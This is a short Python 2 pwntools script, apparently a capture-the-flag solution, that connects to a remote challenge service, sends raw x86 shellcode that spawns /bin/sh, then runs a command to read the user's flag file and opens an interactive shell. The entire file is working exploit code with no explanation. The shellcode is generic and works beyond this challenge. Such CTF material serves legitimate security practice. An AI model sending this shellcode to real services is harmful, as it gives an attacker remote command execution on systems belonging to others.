#!/usr/bin/env python2
from pwn import *


host , port = '172.16.115.109' , 10101
host , port = 'ctf.yuawn.idv.tw' , 10108
host , port = '172.16.115.109' , 10108
#host , port = '192.168.78.251' , 4000
y = remote( host , port )


y.send( 'jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80' )

y.sendline('cat /home/`whoami`/flag')

y.interactive()